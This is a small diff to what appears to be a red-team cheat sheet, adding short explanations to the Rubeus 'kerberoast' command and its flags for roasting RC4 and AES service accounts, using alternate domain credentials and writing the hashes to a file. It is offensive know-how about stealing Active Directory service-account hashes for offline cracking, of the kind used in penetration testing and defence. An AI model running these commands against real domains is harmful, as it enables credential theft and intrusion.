@@ -744,12 +744,12 @@ https://blog.harmj0y.net/redteaming/kerberoasting-revisited/
 ```.\Rubeus.exe kerberoast```
 
 - ```/spn:```
-- ```/tgtdeleg```
-- ```/aes```
-- ```/creduser:domain\Administrator``` and ```/credpassword:```
+- ```/tgtdeleg``` - used to perform the tgt delegation trick to roast all rc4 enabled accounts
+- ```/aes``` - roast all AES enabled accounts while using KerberosRequestorSecurityToken
+- ```/creduser:domain\Administrator``` and ```/credpassword:``` - Alternate domain credentials
 
-- ```/simple /nowrap```
-- ```/outfile:hash.txt```
+- ```/simple /nowrap``` - hashes are output in the console one per line &&  results will not be line wrapped
+- ```/outfile:hash.txt``` 
 * * *
 
 
